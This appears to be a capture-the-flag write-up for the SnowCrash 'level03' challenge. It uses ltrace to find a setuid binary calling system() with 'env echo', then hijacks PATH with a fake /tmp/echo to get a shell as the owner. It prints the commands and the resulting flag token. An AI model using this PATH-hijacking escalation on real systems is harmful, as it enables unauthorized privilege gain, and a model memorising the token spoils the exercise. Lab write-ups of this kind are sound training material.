We find in the **home** folder a binary **level03** which, when we launch it, displays a message :
<pre><code>> ./level03
Exploit me</code></pre>

We want to know what the binary does, so we use **ltrace** :
<pre><code>> ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580
getegid()											= 2003
geteuid()											= 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
--- SIGCHLD (Child exited) ---
<... system resumed> )
</code></pre>
We observe that the binary makes a **system** call to make a **echo**

So we try to change this call to have access to a shell with the owner's permissions :

<pre><code>> echo "/bin/bash" > /tmp/echo
> chmod 777 /tmp/echo && export PATH=/tmp:$PATH
</code></pre>
> We replace the **/bin/echo** by a **/bin/bash** to launch a new bash instance with higher rights (those of the owner)

Let's run our binary again :
<pre><code>> ./level03</code></pre>

Our user goes from <code>level03@SnowCrash</code> to <code>flag03@SnowCrash</code>

So our user has changed :
<pre>
<code>> getflag</code>
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
</pre>
> The **getflag** command is the only command we can do, of course, otherwise it would be possible for us to do what we want on the ISO


## Alternative

<pre><code>> echo "/bin/getflag" > /tmp/echo
> chmod 777 /tmp/echo && export PATH=/tmp:$PATH
</code></pre>

Let's run our binary again :
<pre><code>> ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
</code></pre>